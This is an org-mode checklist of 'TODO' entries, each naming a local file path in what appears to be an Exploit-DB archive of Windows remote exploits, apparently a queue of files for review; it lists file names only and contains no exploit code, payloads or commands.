**** TODO file:/root/work/exploitdb/winremote/21274.c
**** TODO file:/root/work/exploitdb/winremote/21286.c
**** TODO file:/root/work/exploitdb/winremote/21291.pl
**** TODO file:/root/work/exploitdb/winremote/21292.pl
**** TODO file:/root/work/exploitdb/winremote/21294.c
**** TODO file:/root/work/exploitdb/winremote/21298.c
**** TODO file:/root/work/exploitdb/winremote/21303.txt
**** TODO file:/root/work/exploitdb/winremote/21305.c
**** TODO file:/root/work/exploitdb/winremote/21306.c
**** TODO file:/root/work/exploitdb/winremote/21307.txt
**** TODO file:/root/work/exploitdb/winremote/21311.txt
**** TODO file:/root/work/exploitdb/winremote/21313.txt
**** TODO file:/root/work/exploitdb/winremote/21350.pl
**** TODO file:/root/work/exploitdb/winremote/21361.txt
**** TODO file:/root/work/exploitdb/winremote/21367.txt
**** TODO file:/root/work/exploitdb/winremote/21368.c
**** TODO file:/root/work/exploitdb/winremote/21369.c
**** TODO file:/root/work/exploitdb/winremote/21370.c
**** TODO file:/root/work/exploitdb/winremote/21371.c
**** TODO file:/root/work/exploitdb/winremote/21372.txt
**** TODO file:/root/work/exploitdb/winremote/21376.html
**** TODO file:/root/work/exploitdb/winremote/21385.txt
**** TODO file:/root/work/exploitdb/winremote/21386.html
**** TODO file:/root/work/exploitdb/winremote/2140.pm
**** TODO file:/root/work/exploitdb/winremote/21410.pl
**** TODO file:/root/work/exploitdb/winremote/21438.txt
**** TODO file:/root/work/exploitdb/winremote/21439.txt
**** TODO file:/root/work/exploitdb/winremote/21446.txt
**** TODO file:/root/work/exploitdb/winremote/21451.txt
**** TODO file:/root/work/exploitdb/winremote/21452.txt
**** TODO file:/root/work/exploitdb/winremote/21466.c
**** TODO file:/root/work/exploitdb/winremote/21467.c
**** TODO file:/root/work/exploitdb/winremote/21468.pl
**** TODO file:/root/work/exploitdb/winremote/21469.txt
**** TODO file:/root/work/exploitdb/winremote/21470.txt
**** TODO file:/root/work/exploitdb/winremote/21475.txt
**** TODO file:/root/work/exploitdb/winremote/21483.html
**** TODO file:/root/work/exploitdb/winremote/21484.c
**** TODO file:/root/work/exploitdb/winremote/21485.txt
**** TODO file:/root/work/exploitdb/winremote/2162.pm
**** TODO file:/root/work/exploitdb/winremote/2164.pm
**** TODO file:/root/work/exploitdb/winremote/2223.c
**** TODO file:/root/work/exploitdb/winremote/2233.c
**** TODO file:/root/work/exploitdb/winremote/2234.py
**** TODO file:/root/work/exploitdb/winremote/2258.py
**** TODO file:/root/work/exploitdb/winremote/2265.c
**** TODO file:/root/work/exploitdb/winremote/2276.pm
**** TODO file:/root/work/exploitdb/winremote/2277.c
**** TODO file:/root/work/exploitdb/winremote/2283.c
**** TODO file:/root/work/exploitdb/winremote/2320.txt
**** TODO file:/root/work/exploitdb/winremote/2328.php
**** TODO file:/root/work/exploitdb/winremote/232.c
**** TODO file:/root/work/exploitdb/winremote/2345.pl
**** TODO file:/root/work/exploitdb/winremote/2355.pm
**** TODO file:/root/work/exploitdb/winremote/2358.c
**** TODO file:/root/work/exploitdb/winremote/23.c
**** TODO file:/root/work/exploitdb/winremote/2401.c
**** TODO file:/root/work/exploitdb/winremote/2403.c
**** TODO file:/root/work/exploitdb/winremote/2408.pl
**** TODO file:/root/work/exploitdb/winremote/2425.html
**** TODO file:/root/work/exploitdb/winremote/2426.pl
**** TODO file:/root/work/exploitdb/winremote/2440.rb
**** TODO file:/root/work/exploitdb/winremote/2445.c
**** TODO file:/root/work/exploitdb/winremote/2448.html
**** TODO file:/root/work/exploitdb/winremote/2458.pl
**** TODO file:/root/work/exploitdb/winremote/2460.c
**** TODO file:/root/work/exploitdb/winremote/2467.pm
**** TODO file:/root/work/exploitdb/winremote/2482.pl
**** TODO file:/root/work/exploitdb/winremote/2530.py
**** TODO file:/root/work/exploitdb/winremote/2601.c
**** TODO file:/root/work/exploitdb/winremote/2637.c
**** TODO file:/root/work/exploitdb/winremote/2649.c
**** TODO file:/root/work/exploitdb/winremote/2651.c
**** TODO file:/root/work/exploitdb/winremote/2657.html
**** TODO file:/root/work/exploitdb/winremote/266.c
**** TODO file:/root/work/exploitdb/winremote/2671.pl
**** TODO file:/root/work/exploitdb/winremote/2680.pm
**** TODO file:/root/work/exploitdb/winremote/2689.c
**** TODO file:/root/work/exploitdb/winremote/268.c
**** TODO file:/root/work/exploitdb/winremote/2690.c
**** TODO file:/root/work/exploitdb/winremote/2699.c
**** TODO file:/root/work/exploitdb/winremote/2729.pm
**** TODO file:/root/work/exploitdb/winremote/2743.html
**** TODO file:/root/work/exploitdb/winremote/2749.html
**** TODO file:/root/work/exploitdb/winremote/2753.c
**** TODO file:/root/work/exploitdb/winremote/275.c
**** TODO file:/root/work/exploitdb/winremote/2770.rb
**** TODO file:/root/work/exploitdb/winremote/2771.rb
**** TODO file:/root/work/exploitdb/winremote/2785.c
**** TODO file:/root/work/exploitdb/winremote/2789.cpp
**** TODO file:/root/work/exploitdb/winremote/2800.cpp
**** TODO file:/root/work/exploitdb/winremote/2809.py
**** TODO file:/root/work/exploitdb/winremote/2821.c
**** TODO file:/root/work/exploitdb/winremote/2865.rb
**** TODO file:/root/work/exploitdb/winremote/2866.html
**** TODO file:/root/work/exploitdb/winremote/2870.rb
**** TODO file:/root/work/exploitdb/winremote/2887.pl
**** TODO file:/root/work/exploitdb/winremote/28.c
**** TODO file:/root/work/exploitdb/winremote/293.c
**** TODO file:/root/work/exploitdb/winremote/295.c
**** TODO file:/root/work/exploitdb/winremote/2974.pl
**** TODO file:/root/work/exploitdb/winremote/297.c
**** TODO file:/root/work/exploitdb/winremote/2.c
**** TODO file:/root/work/exploitdb/winremote/3022.txt
**** TODO file:/root/work/exploitdb/winremote/3037.php
**** TODO file:/root/work/exploitdb/winremote/3055.html
**** TODO file:/root/work/exploitdb/winremote/3058.html
**** TODO file:/root/work/exploitdb/winremote/3063.pl
**** TODO file:/root/work/exploitdb/winremote/3067.txt
**** TODO file:/root/work/exploitdb/winremote/3072.py
**** TODO file:/root/work/exploitdb/winremote/3084.txt
**** TODO file:/root/work/exploitdb/winremote/3086.py
**** TODO file:/root/work/exploitdb/winremote/3092.pm
**** TODO file:/root/work/exploitdb/winremote/30.pl
**** TODO file:/root/work/exploitdb/winremote/3107.pm
**** TODO file:/root/work/exploitdb/winremote/310.txt
**** TODO file:/root/work/exploitdb/winremote/3132.pl
**** TODO file:/root/work/exploitdb/winremote/3133.pl
**** TODO file:/root/work/exploitdb/winremote/3137.html
**** TODO file:/root/work/exploitdb/winremote/313.txt
**** TODO file:/root/work/exploitdb/winremote/3140.pl
**** TODO file:/root/work/exploitdb/winremote/3148.pl
**** TODO file:/root/work/exploitdb/winremote/3158.c
**** TODO file:/root/work/exploitdb/winremote/315.txt
**** TODO file:/root/work/exploitdb/winremote/3168.java
**** TODO file:/root/work/exploitdb/winremote/316.txt
**** TODO file:/root/work/exploitdb/winremote/3170.pm
**** TODO file:/root/work/exploitdb/winremote/3211.py
**** TODO file:/root/work/exploitdb/winremote/3218.pl
**** TODO file:/root/work/exploitdb/winremote/3244.py
**** TODO file:/root/work/exploitdb/winremote/3264.pl
**** TODO file:/root/work/exploitdb/winremote/3265.pm
**** TODO file:/root/work/exploitdb/winremote/3274.txt
**** TODO file:/root/work/exploitdb/winremote/3279.html
**** TODO file:/root/work/exploitdb/winremote/3291.pl
**** TODO file:/root/work/exploitdb/winremote/3296.c
**** TODO file:/root/work/exploitdb/winremote/3302.sh
**** TODO file:/root/work/exploitdb/winremote/3319.pl
**** TODO file:/root/work/exploitdb/winremote/3320.pl
**** TODO file:/root/work/exploitdb/winremote/3335.pm
**** TODO file:/root/work/exploitdb/winremote/3340.html
**** TODO file:/root/work/exploitdb/winremote/3364.pl
**** TODO file:/root/work/exploitdb/winremote/3380.txt
**** TODO file:/root/work/exploitdb/winremote/3381.pl
**** TODO file:/root/work/exploitdb/winremote/3388.pl
**** TODO file:/root/work/exploitdb/winremote/3391.py
**** TODO file:/root/work/exploitdb/winremote/3395.c
**** TODO file:/root/work/exploitdb/winremote/3397.pl
**** TODO file:/root/work/exploitdb/winremote/3420.html
**** TODO file:/root/work/exploitdb/winremote/3422.pl
**** TODO file:/root/work/exploitdb/winremote/3462.cpp
**** TODO file:/root/work/exploitdb/winremote/3463.cpp
**** TODO file:/root/work/exploitdb/winremote/3474.py
**** TODO file:/root/work/exploitdb/winremote/3482.pl
**** TODO file:/root/work/exploitdb/winremote/3495.txt
**** TODO file:/root/work/exploitdb/winremote/3531.py
**** TODO file:/root/work/exploitdb/winremote/3537.py
**** TODO file:/root/work/exploitdb/winremote/3540.py
**** TODO file:/root/work/exploitdb/winremote/3541.pl
**** TODO file:/root/work/exploitdb/winremote/3544.c
**** TODO file:/root/work/exploitdb/winremote/3561.pl
**** TODO file:/root/work/exploitdb/winremote/3570.c
**** TODO file:/root/work/exploitdb/winremote/3575.cpp
**** TODO file:/root/work/exploitdb/winremote/3577.html
**** TODO file:/root/work/exploitdb/winremote/3579.py
**** TODO file:/root/work/exploitdb/winremote/3589.pm
**** TODO file:/root/work/exploitdb/winremote/3604.py
**** TODO file:/root/work/exploitdb/winremote/3610.html
**** TODO file:/root/work/exploitdb/winremote/3616.py
**** TODO file:/root/work/exploitdb/winremote/361.txt
**** TODO file:/root/work/exploitdb/winremote/3627.c
**** TODO file:/root/work/exploitdb/winremote/3634.txt
**** TODO file:/root/work/exploitdb/winremote/3635.txt
**** TODO file:/root/work/exploitdb/winremote/3636.txt
**** TODO file:/root/work/exploitdb/winremote/3650.c
**** TODO file:/root/work/exploitdb/winremote/3651.txt
**** TODO file:/root/work/exploitdb/winremote/3661.pl
**** TODO file:/root/work/exploitdb/winremote/3662.rb
**** TODO file:/root/work/exploitdb/winremote/3675.rb
**** TODO file:/root/work/exploitdb/winremote/3680.sh
**** TODO file:/root/work/exploitdb/winremote/36.c
**** TODO file:/root/work/exploitdb/winremote/3728.c
**** TODO file:/root/work/exploitdb/winremote/3737.py
**** TODO file:/root/work/exploitdb/winremote/3738.php
**** TODO file:/root/work/exploitdb/winremote/3740.c
**** TODO file:/root/work/exploitdb/winremote/3746.txt
**** TODO file:/root/work/exploitdb/winremote/378.pl
**** TODO file:/root/work/exploitdb/winremote/37.pl
**** TODO file:/root/work/exploitdb/winremote/3804.txt
**** TODO file:/root/work/exploitdb/winremote/3808.html
**** TODO file:/root/work/exploitdb/winremote/3810.html
**** TODO file:/root/work/exploitdb/winremote/3822.c
**** TODO file:/root/work/exploitdb/winremote/3844.html
**** TODO file:/root/work/exploitdb/winremote/3872.html
**** TODO file:/root/work/exploitdb/winremote/3877.html
**** TODO file:/root/work/exploitdb/winremote/3880.html
**** TODO file:/root/work/exploitdb/winremote/3881.html
**** TODO file:/root/work/exploitdb/winremote/3882.html
**** TODO file:/root/work/exploitdb/winremote/3892.html
**** TODO file:/root/work/exploitdb/winremote/3893.c
**** TODO file:/root/work/exploitdb/winremote/3899.html
**** TODO file:/root/work/exploitdb/winremote/3913.c
**** TODO file:/root/work/exploitdb/winremote/3916.php
**** TODO file:/root/work/exploitdb/winremote/3925.py
**** TODO file:/root/work/exploitdb/winremote/3927.html
**** TODO file:/root/work/exploitdb/winremote/3934.py
**** TODO file:/root/work/exploitdb/winremote/3938.html
**** TODO file:/root/work/exploitdb/winremote/3950.html
**** TODO file:/root/work/exploitdb/winremote/3951.html
**** TODO file:/root/work/exploitdb/winremote/3952.html
**** TODO file:/root/work/exploitdb/winremote/3954.py
**** TODO file:/root/work/exploitdb/winremote/3961.html
**** TODO file:/root/work/exploitdb/winremote/3966.php
**** TODO file:/root/work/exploitdb/winremote/3967.html
**** TODO file:/root/work/exploitdb/winremote/3968.html
**** TODO file:/root/work/exploitdb/winremote/3982.html
**** TODO file:/root/work/exploitdb/winremote/3984.html
**** TODO file:/root/work/exploitdb/winremote/3993.html
**** TODO file:/root/work/exploitdb/winremote/3996.c
**** TODO file:/root/work/exploitdb/winremote/4008.html
**** TODO file:/root/work/exploitdb/winremote/4010.html
**** TODO file:/root/work/exploitdb/winremote/4014.py
**** TODO file:/root/work/exploitdb/winremote/4015.html
**** TODO file:/root/work/exploitdb/winremote/4016.sh
**** TODO file:/root/work/exploitdb/winremote/4021.html
**** TODO file:/root/work/exploitdb/winremote/4023.html
**** TODO file:/root/work/exploitdb/winremote/4027.py
**** TODO file:/root/work/exploitdb/winremote/4042.html
**** TODO file:/root/work/exploitdb/winremote/4043.html
**** TODO file:/root/work/exploitdb/winremote/4045.py
**** TODO file:/root/work/exploitdb/winremote/4049.html
**** TODO file:/root/work/exploitdb/winremote/4050.html
**** TODO file:/root/work/exploitdb/winremote/4052.c
**** TODO file:/root/work/exploitdb/winremote/4053.c
**** TODO file:/root/work/exploitdb/winremote/4060.html
**** TODO file:/root/work/exploitdb/winremote/4061.html
**** TODO file:/root/work/exploitdb/winremote/4065.html
**** TODO file:/root/work/exploitdb/winremote/4066.html
**** TODO file:/root/work/exploitdb/winremote/4094.html
**** TODO file:/root/work/exploitdb/winremote/4101.html
**** TODO file:/root/work/exploitdb/winremote/4109.html
**** TODO file:/root/work/exploitdb/winremote/4110.html
**** TODO file:/root/work/exploitdb/winremote/4119.html
**** TODO file:/root/work/exploitdb/winremote/4123.html
**** TODO file:/root/work/exploitdb/winremote/4143.html
**** TODO file:/root/work/exploitdb/winremote/4146.cpp
**** TODO file:/root/work/exploitdb/winremote/4152.py
**** TODO file:/root/work/exploitdb/winremote/4155.html
**** TODO file:/root/work/exploitdb/winremote/4157.cpp
**** TODO file:/root/work/exploitdb/winremote/4158.html
**** TODO file:/root/work/exploitdb/winremote/4160.html
**** TODO file:/root/work/exploitdb/winremote/4170.html
**** TODO file:/root/work/exploitdb/winremote/4176.html
**** TODO file:/root/work/exploitdb/winremote/4177.html
**** TODO file:/root/work/exploitdb/winremote/4188.txt
**** TODO file:/root/work/exploitdb/winremote/418.c
**** TODO file:/root/work/exploitdb/winremote/4190.html
**** TODO file:/root/work/exploitdb/winremote/4200.html
**** TODO file:/root/work/exploitdb/winremote/4207.py
**** TODO file:/root/work/exploitdb/winremote/4208.html
**** TODO file:/root/work/exploitdb/winremote/4214.html
**** TODO file:/root/work/exploitdb/winremote/4217.html
**** TODO file:/root/work/exploitdb/winremote/421.c
**** TODO file:/root/work/exploitdb/winremote/4222.c
**** TODO file:/root/work/exploitdb/winremote/4223.pl
**** TODO file:/root/work/exploitdb/winremote/4226.html
**** TODO file:/root/work/exploitdb/winremote/4228.pl
**** TODO file:/root/work/exploitdb/winremote/4230.html
**** TODO file:/root/work/exploitdb/winremote/4234.html
**** TODO file:/root/work/exploitdb/winremote/4237.html
**** TODO file:/root/work/exploitdb/winremote/4240.html
**** TODO file:/root/work/exploitdb/winremote/4244.html
**** TODO file:/root/work/exploitdb/winremote/4245.html
**** TODO file:/root/work/exploitdb/winremote/4247.c
**** TODO file:/root/work/exploitdb/winremote/4250.html
**** TODO file:/root/work/exploitdb/winremote/4255.html
**** TODO file:/root/work/exploitdb/winremote/4259.txt
**** TODO file:/root/work/exploitdb/winremote/426.c
**** TODO file:/root/work/exploitdb/winremote/4279.html
**** TODO file:/root/work/exploitdb/winremote/4280.pl
**** TODO file:/root/work/exploitdb/winremote/4283.pl
**** TODO file:/root/work/exploitdb/winremote/4287.py
**** TODO file:/root/work/exploitdb/winremote/4290.html
**** TODO file:/root/work/exploitdb/winremote/4292.cpp
**** TODO file:/root/work/exploitdb/winremote/4299.html
**** TODO file:/root/work/exploitdb/winremote/42.c
**** TODO file:/root/work/exploitdb/winremote/4301.cpp
**** TODO file:/root/work/exploitdb/winremote/4316.cpp
**** TODO file:/root/work/exploitdb/winremote/431.c
**** TODO file:/root/work/exploitdb/winremote/4322.html
**** TODO file:/root/work/exploitdb/winremote/4323.html
**** TODO file:/root/work/exploitdb/winremote/4324.html
**** TODO file:/root/work/exploitdb/winremote/4328.html
**** TODO file:/root/work/exploitdb/winremote/4334.txt
**** TODO file:/root/work/exploitdb/winremote/4348.c
**** TODO file:/root/work/exploitdb/winremote/4351.html
**** TODO file:/root/work/exploitdb/winremote/4357.html
**** TODO file:/root/work/exploitdb/winremote/435.c
**** TODO file:/root/work/exploitdb/winremote/4360.rb
**** TODO file:/root/work/exploitdb/winremote/4366.html
**** TODO file:/root/work/exploitdb/winremote/4367.c
**** TODO file:/root/work/exploitdb/winremote/4372.html
**** TODO file:/root/work/exploitdb/winremote/4388.html
**** TODO file:/root/work/exploitdb/winremote/4389.html
**** TODO file:/root/work/exploitdb/winremote/4393.html
**** TODO file:/root/work/exploitdb/winremote/4394.html
**** TODO file:/root/work/exploitdb/winremote/4398.html
**** TODO file:/root/work/exploitdb/winremote/439.c
**** TODO file:/root/work/exploitdb/winremote/4420.html
**** TODO file:/root/work/exploitdb/winremote/4424.html
**** TODO file:/root/work/exploitdb/winremote/4427.html
**** TODO file:/root/work/exploitdb/winremote/4428.html
**** TODO file:/root/work/exploitdb/winremote/4429.pl
**** TODO file:/root/work/exploitdb/winremote/4438.cpp
**** TODO file:/root/work/exploitdb/winremote/4445.html
**** TODO file:/root/work/exploitdb/winremote/4450.py
**** TODO file:/root/work/exploitdb/winremote/4452.html
**** TODO file:/root/work/exploitdb/winremote/4453.html
**** TODO file:/root/work/exploitdb/winremote/4455.pl
**** TODO file:/root/work/exploitdb/winremote/4468.html
**** TODO file:/root/work/exploitdb/winremote/4484.pl
**** TODO file:/root/work/exploitdb/winremote/4487.html
**** TODO file:/root/work/exploitdb/winremote/4488.html
**** TODO file:/root/work/exploitdb/winremote/4506.html
**** TODO file:/root/work/exploitdb/winremote/4526.html
**** TODO file:/root/work/exploitdb/winremote/4566.rb
**** TODO file:/root/work/exploitdb/winremote/4573.py
**** TODO file:/root/work/exploitdb/winremote/4574.pl
**** TODO file:/root/work/exploitdb/winremote/4579.html
**** TODO file:/root/work/exploitdb/winremote/4594.html
**** TODO file:/root/work/exploitdb/winremote/4598.html
**** TODO file:/root/work/exploitdb/winremote/45.c
**** TODO file:/root/work/exploitdb/winremote/4616.pl
**** TODO file:/root/work/exploitdb/winremote/4651.cpp
**** TODO file:/root/work/exploitdb/winremote/4657.py
**** TODO file:/root/work/exploitdb/winremote/4663.html
**** TODO file:/root/work/exploitdb/winremote/4664.txt
**** TODO file:/root/work/exploitdb/winremote/4699.txt
**** TODO file:/root/work/exploitdb/winremote/4700.txt
**** TODO file:/root/work/exploitdb/winremote/4713.txt
**** TODO file:/root/work/exploitdb/winremote/4715.txt
**** TODO file:/root/work/exploitdb/winremote/4720.html
**** TODO file:/root/work/exploitdb/winremote/4724.py
**** TODO file:/root/work/exploitdb/winremote/472.c
**** TODO file:/root/work/exploitdb/winremote/473.c
**** TODO file:/root/work/exploitdb/winremote/4745.cpp
**** TODO file:/root/work/exploitdb/winremote/4746.html
**** TODO file:/root/work/exploitdb/winremote/4747.vbs
**** TODO file:/root/work/exploitdb/winremote/4754.pl
**** TODO file:/root/work/exploitdb/winremote/475.sh
**** TODO file:/root/work/exploitdb/winremote/4760.txt
**** TODO file:/root/work/exploitdb/winremote/4784.pl
**** TODO file:/root/work/exploitdb/winremote/478.c
**** TODO file:/root/work/exploitdb/winremote/4806.html
**** TODO file:/root/work/exploitdb/winremote/480.c
**** TODO file:/root/work/exploitdb/winremote/4818.html
**** TODO file:/root/work/exploitdb/winremote/4819.html
**** TODO file:/root/work/exploitdb/winremote/4820.html
**** TODO file:/root/work/exploitdb/winremote/4825.html
**** TODO file:/root/work/exploitdb/winremote/4866.py
**** TODO file:/root/work/exploitdb/winremote/4868.html
**** TODO file:/root/work/exploitdb/winremote/4869.html
**** TODO file:/root/work/exploitdb/winremote/4873.html
**** TODO file:/root/work/exploitdb/winremote/4874.html
**** TODO file:/root/work/exploitdb/winremote/4894.html
**** TODO file:/root/work/exploitdb/winremote/48.c
**** TODO file:/root/work/exploitdb/winremote/4903.html
**** TODO file:/root/work/exploitdb/winremote/4906.txt
**** TODO file:/root/work/exploitdb/winremote/4909.html
**** TODO file:/root/work/exploitdb/winremote/4913.html
**** TODO file:/root/work/exploitdb/winremote/4918.html
**** TODO file:/root/work/exploitdb/winremote/4923.txt
**** TODO file:/root/work/exploitdb/winremote/4932.html
**** TODO file:/root/work/exploitdb/winremote/4934.c
**** TODO file:/root/work/exploitdb/winremote/4946.html
**** TODO file:/root/work/exploitdb/winremote/4948.txt
**** TODO file:/root/work/exploitdb/winremote/4949.txt
**** TODO file:/root/work/exploitdb/winremote/4959.html
**** TODO file:/root/work/exploitdb/winremote/4967.html
**** TODO file:/root/work/exploitdb/winremote/4974.html
**** TODO file:/root/work/exploitdb/winremote/4979.html
**** TODO file:/root/work/exploitdb/winremote/4981.html
**** TODO file:/root/work/exploitdb/winremote/4982.html
**** TODO file:/root/work/exploitdb/winremote/4986.html
**** TODO file:/root/work/exploitdb/winremote/4987.html
**** TODO file:/root/work/exploitdb/winremote/4999.htm
**** TODO file:/root/work/exploitdb/winremote/5005.html
**** TODO file:/root/work/exploitdb/winremote/5025.html
**** TODO file:/root/work/exploitdb/winremote/5028.html
**** TODO file:/root/work/exploitdb/winremote/5045.html
**** TODO file:/root/work/exploitdb/winremote/5046.php
**** TODO file:/root/work/exploitdb/winremote/5048.html
**** TODO file:/root/work/exploitdb/winremote/5049.html
**** TODO file:/root/work/exploitdb/winremote/5051.html
**** TODO file:/root/work/exploitdb/winremote/5052.html
**** TODO file:/root/work/exploitdb/winremote/5069.pl
**** TODO file:/root/work/exploitdb/winremote/5078.htm
**** TODO file:/root/work/exploitdb/winremote/5079.c
**** TODO file:/root/work/exploitdb/winremote/5087.html
**** TODO file:/root/work/exploitdb/winremote/50.pl
**** TODO file:/root/work/exploitdb/winremote/5100.html
**** TODO file:/root/work/exploitdb/winremote/5102.html
**** TODO file:/root/work/exploitdb/winremote/5106.html
**** TODO file:/root/work/exploitdb/winremote/5111.html
**** TODO file:/root/work/exploitdb/winremote/5153.asp
**** TODO file:/root/work/exploitdb/winremote/5188.html
**** TODO file:/root/work/exploitdb/winremote/5190.html
**** TODO file:/root/work/exploitdb/winremote/5193.html
**** TODO file:/root/work/exploitdb/winremote/51.c
**** TODO file:/root/work/exploitdb/winremote/5205.html
**** TODO file:/root/work/exploitdb/winremote/5212.py
**** TODO file:/root/work/exploitdb/winremote/5213.txt
**** TODO file:/root/work/exploitdb/winremote/5228.txt
**** TODO file:/root/work/exploitdb/winremote/5230.txt
**** TODO file:/root/work/exploitdb/winremote/5238.py
**** TODO file:/root/work/exploitdb/winremote/5248.py
**** TODO file:/root/work/exploitdb/winremote/5249.pl
**** TODO file:/root/work/exploitdb/winremote/5259.py
**** TODO file:/root/work/exploitdb/winremote/5264.html
**** TODO file:/root/work/exploitdb/winremote/5269.txt
**** TODO file:/root/work/exploitdb/winremote/5314.py
**** TODO file:/root/work/exploitdb/winremote/5315.py
**** TODO file:/root/work/exploitdb/winremote/5330.c
**** TODO file:/root/work/exploitdb/winremote/5332.html
**** TODO file:/root/work/exploitdb/winremote/5338.html
**** TODO file:/root/work/exploitdb/winremote/5342.py
**** TODO file:/root/work/exploitdb/winremote/5395.html
**** TODO file:/root/work/exploitdb/winremote/5397.txt
**** TODO file:/root/work/exploitdb/winremote/5398.html
**** TODO file:/root/work/exploitdb/winremote/5416.html
**** TODO file:/root/work/exploitdb/winremote/5445.cpp
**** TODO file:/root/work/exploitdb/winremote/5451.py
**** TODO file:/root/work/exploitdb/winremote/5461.rb
**** TODO file:/root/work/exploitdb/winremote/5489.html
**** TODO file:/root/work/exploitdb/winremote/5496.html
**** TODO file:/root/work/exploitdb/winremote/54.c
**** TODO file:/root/work/exploitdb/winremote/5511.html
**** TODO file:/root/work/exploitdb/winremote/5519.c
**** TODO file:/root/work/exploitdb/winremote/5530.html
**** TODO file:/root/work/exploitdb/winremote/5536.php
**** TODO file:/root/work/exploitdb/winremote/5563.pl
**** TODO file:/root/work/exploitdb/winremote/556.c
**** TODO file:/root/work/exploitdb/winremote/5612.html
**** TODO file:/root/work/exploitdb/winremote/5619.html
**** TODO file:/root/work/exploitdb/winremote/566.pl
**** TODO file:/root/work/exploitdb/winremote/5681.html
**** TODO file:/root/work/exploitdb/winremote/568.c
**** TODO file:/root/work/exploitdb/winremote/5694.cpp
**** TODO file:/root/work/exploitdb/winremote/5695.cpp
**** TODO file:/root/work/exploitdb/winremote/56.c
**** TODO file:/root/work/exploitdb/winremote/572.pl
**** TODO file:/root/work/exploitdb/winremote/5732.html
**** TODO file:/root/work/exploitdb/winremote/5738.rb
**** TODO file:/root/work/exploitdb/winremote/573.c
**** TODO file:/root/work/exploitdb/winremote/5741.html
**** TODO file:/root/work/exploitdb/winremote/5746.html
**** TODO file:/root/work/exploitdb/winremote/5747.html
**** TODO file:/root/work/exploitdb/winremote/5750.html
**** TODO file:/root/work/exploitdb/winremote/5751.pl
**** TODO file:/root/work/exploitdb/winremote/5777.html
**** TODO file:/root/work/exploitdb/winremote/5778.html
**** TODO file:/root/work/exploitdb/winremote/577.c
**** TODO file:/root/work/exploitdb/winremote/5793.html
**** TODO file:/root/work/exploitdb/winremote/5795.html
**** TODO file:/root/work/exploitdb/winremote/5827.cpp
**** TODO file:/root/work/exploitdb/winremote/582.c
**** TODO file:/root/work/exploitdb/winremote/583.pl
**** TODO file:/root/work/exploitdb/winremote/584.c
**** TODO file:/root/work/exploitdb/winremote/588.py
**** TODO file:/root/work/exploitdb/winremote/589.html
**** TODO file:/root/work/exploitdb/winremote/590.c
**** TODO file:/root/work/exploitdb/winremote/592.py
**** TODO file:/root/work/exploitdb/winremote/598.py
**** TODO file:/root/work/exploitdb/winremote/5.c
**** TODO file:/root/work/exploitdb/winremote/6004.txt
**** TODO file:/root/work/exploitdb/winremote/6012.php
**** TODO file:/root/work/exploitdb/winremote/6089.pl
**** TODO file:/root/work/exploitdb/winremote/6100.py
**** TODO file:/root/work/exploitdb/winremote/6116.pl
**** TODO file:/root/work/exploitdb/winremote/6118.pl
**** TODO file:/root/work/exploitdb/winremote/6121.c
**** TODO file:/root/work/exploitdb/winremote/6124.c
**** TODO file:/root/work/exploitdb/winremote/612.html
**** TODO file:/root/work/exploitdb/winremote/6151.txt
**** TODO file:/root/work/exploitdb/winremote/6152.html
**** TODO file:/root/work/exploitdb/winremote/616.c
**** TODO file:/root/work/exploitdb/winremote/6175.html
**** TODO file:/root/work/exploitdb/winremote/618.c
**** TODO file:/root/work/exploitdb/winremote/6195.c
**** TODO file:/root/work/exploitdb/winremote/619.c
**** TODO file:/root/work/exploitdb/winremote/6217.pl
**** TODO file:/root/work/exploitdb/winremote/621.c
**** TODO file:/root/work/exploitdb/winremote/6220.html
**** TODO file:/root/work/exploitdb/winremote/6227.c
**** TODO file:/root/work/exploitdb/winremote/6238.c
**** TODO file:/root/work/exploitdb/winremote/623.c
**** TODO file:/root/work/exploitdb/winremote/6248.pl
**** TODO file:/root/work/exploitdb/winremote/6256.pl
**** TODO file:/root/work/exploitdb/winremote/6278.txt
**** TODO file:/root/work/exploitdb/winremote/627.pl
**** TODO file:/root/work/exploitdb/winremote/6302.pl
**** TODO file:/root/work/exploitdb/winremote/6317.html
**** TODO file:/root/work/exploitdb/winremote/6318.html
**** TODO file:/root/work/exploitdb/winremote/6323.html
**** TODO file:/root/work/exploitdb/winremote/6324.html
**** TODO file:/root/work/exploitdb/winremote/6334.html
**** TODO file:/root/work/exploitdb/winremote/6355.txt
**** TODO file:/root/work/exploitdb/winremote/6367.txt
**** TODO file:/root/work/exploitdb/winremote/636.c
**** TODO file:/root/work/exploitdb/winremote/637.c
**** TODO file:/root/work/exploitdb/winremote/6387.rb
**** TODO file:/root/work/exploitdb/winremote/638.py
**** TODO file:/root/work/exploitdb/winremote/6407.c
**** TODO file:/root/work/exploitdb/winremote/640.c
**** TODO file:/root/work/exploitdb/winremote/6414.html
**** TODO file:/root/work/exploitdb/winremote/641.txt
**** TODO file:/root/work/exploitdb/winremote/644.pl
**** TODO file:/root/work/exploitdb/winremote/6454.html
**** TODO file:/root/work/exploitdb/winremote/6491.html
**** TODO file:/root/work/exploitdb/winremote/64.c
**** TODO file:/root/work/exploitdb/winremote/6506.txt
**** TODO file:/root/work/exploitdb/winremote/650.c
**** TODO file:/root/work/exploitdb/winremote/6537.html
**** TODO file:/root/work/exploitdb/winremote/6548.html
**** TODO file:/root/work/exploitdb/winremote/654.c
**** TODO file:/root/work/exploitdb/winremote/6570.rb
**** TODO file:/root/work/exploitdb/winremote/658.c
**** TODO file:/root/work/exploitdb/winremote/6600.html
**** TODO file:/root/work/exploitdb/winremote/6630.html
**** TODO file:/root/work/exploitdb/winremote/6638.html
**** TODO file:/root/work/exploitdb/winremote/663.py
**** TODO file:/root/work/exploitdb/winremote/6656.txt
**** TODO file:/root/work/exploitdb/winremote/6661.txt
**** TODO file:/root/work/exploitdb/winremote/6666.pl
**** TODO file:/root/work/exploitdb/winremote/6686.txt
**** TODO file:/root/work/exploitdb/winremote/668.c
**** TODO file:/root/work/exploitdb/winremote/6690.html
**** TODO file:/root/work/exploitdb/winremote/6699.html
**** TODO file:/root/work/exploitdb/winremote/66.c
**** TODO file:/root/work/exploitdb/winremote/670.c
**** TODO file:/root/work/exploitdb/winremote/675.txt
**** TODO file:/root/work/exploitdb/winremote/6773.html
**** TODO file:/root/work/exploitdb/winremote/6774.html
**** TODO file:/root/work/exploitdb/winremote/6776.html
**** TODO file:/root/work/exploitdb/winremote/6793.html
**** TODO file:/root/work/exploitdb/winremote/6801.txt
**** TODO file:/root/work/exploitdb/winremote/6804.pl
**** TODO file:/root/work/exploitdb/winremote/6813.html
**** TODO file:/root/work/exploitdb/winremote/6828.html
**** TODO file:/root/work/exploitdb/winremote/6840.html
